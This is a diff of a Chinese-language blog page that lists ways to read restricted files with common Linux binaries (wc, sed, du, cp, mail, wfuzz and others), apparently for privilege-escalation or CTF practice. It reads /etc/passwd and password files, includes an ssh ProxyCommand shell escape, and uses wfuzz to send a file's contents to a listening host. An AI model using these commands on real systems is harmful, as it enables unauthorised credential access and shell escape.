@@ -11,11 +11,11 @@
         document.documentElement.setAttribute("data-color-mode", theme);
     </script>
 <meta name="description" content="
-1.wc命令
+## 1.wc命令
 	 wc（word count）命令是Linux中常用于计算文件的行数、字数和字节数的工具。">
 <meta property="og:title" content="文件读取相关(持续更新)">
 <meta property="og:description" content="
-1.wc命令
+## 1.wc命令
 	 wc（word count）命令是Linux中常用于计算文件的行数、字数和字节数的工具。">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://faabbi.github.io/post/wen-jian-du-qu-xiang-guan-%28-chi-xu-geng-xin-%29.html">
@@ -87,54 +87,60 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
 </div>
     <div id="content">
-<div class="markdown-body" id="postBody"><p>1.wc命令<br>
-wc（word count）命令是Linux中常用于计算文件的行数、字数和字节数的工具。<br>
-可利用读取文件内容</p>
+<div class="markdown-body" id="postBody"><h2>1.wc命令</h2>
+<pre class="notranslate"><code class="notranslate"> wc（word count）命令是Linux中常用于计算文件的行数、字数和字节数的工具。
+ 可利用读取文件内容
+</code></pre>
 <pre class="notranslate"><code class="notranslate">		 wc --files0-form “/etc/passwd”
 </code></pre>
-<p>2.sed命令<br>
-<strong>sed</strong> 是一种强大的流编辑器，用于处理文本数据。它以行为单位执行操作，如添加、删除、替换和更多，使得它成为自动化文本编辑的理想工具。<br>
-利用</p>
+<h2>2.sed命令</h2>
+<pre class="notranslate"><code class="notranslate">   **sed** 是一种强大的流编辑器，用于处理文本数据。它以行为单位执行操作，如添加、删除、替换和更多，使得它成为自动化文本编辑的理想工具。
+   利用
+</code></pre>
 <pre class="notranslate"><code class="notranslate">		   sed -n 'p' /etc/passwd 
 			   -n参数 安静模式只输出被sed处理过的
 </code></pre>
-<p>3.sd命令（类似sed命令）<br>
-利用</p>
+<h2>3.sd命令（类似sed命令）</h2>
+<pre class="notranslate"><code class="notranslate">  利用
+</code></pre>
 <pre class="notranslate"><code class="notranslate">		  sd -p a b /etc/passwd
 			  -p指定预览模式不会对文件做出修改，打印出替换后的结果到终端
 </code></pre>
-<p>4.du命令</p>
+<h2>4.du命令</h2>
 <pre class="notranslate"><code class="notranslate">		du --files0-from=password.txt
 </code></pre>
-<p>5.file命令</p>
+<h2>5.file命令</h2>
 <pre class="notranslate"><code class="notranslate">		file -f password.txt
 </code></pre>
-<p>6.mc命令</p>
+<h2>6.mc命令</h2>
 <pre class="notranslate"><code class="notranslate">		mc -v/-e password.txt
 </code></pre>
-<p>7.ssh命令</p>
+<h2>7.ssh命令</h2>
 <pre class="notranslate"><code class="notranslate">		ssh -o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x
 </code></pre>
-<p>8.rev命令</p>
-<pre class="notranslate"><code class="notranslate">		rev password.txt
+<h2>8.rev命令</h2>
+<pre class="notranslate"><code class="notranslate">		rev password.txt | rev
 		实际上不修改文件内容展示反转后的内容
 </code></pre>
-<p>9.cp命令</p>
+<h2>9.cp命令</h2>
 <p>cp命令在创建文件时会保留源文件的属组和权限，但是如果覆盖文件则是保留覆盖文件的属组和权限</p>
 <pre class="notranslate"><code class="notranslate">		touch /tmp/test
 		chmod 777 /tmp/test
 		cp password.txt /tmp/test 
 </code></pre>
-<p>10.mail命令</p>
+<p>同样也可以直接cp 文件  /dev/stdout</p>
+<pre class="notranslate"><code class="notranslate">		cp password.txt /dev/stdout
+</code></pre>
+<h2>10.mail命令</h2>
 <pre class="notranslate"><code class="notranslate">		mail -f password.txt
 		&amp; !cat password.txt
 		执行命令
 </code></pre>
-<p>11.wfuzz<br>
-将文件视作字典来读，kali开放端口查看响应即可</p>
+<h2>11.wfuzz</h2>
+<p>将文件视作字典来读，kali开放端口查看响应即可</p>
 <pre class="notranslate"><code class="notranslate">wfuzz -c -v -z file,/home/user9/password.txt http://192.168.2.60:81/FUZZ
 </code></pre>
-<p>12.tree</p>
+<h2>12.tree</h2>
 <pre class="notranslate"><code class="notranslate">--help
   --fromfile    Reads paths from files (.=stdin)
 
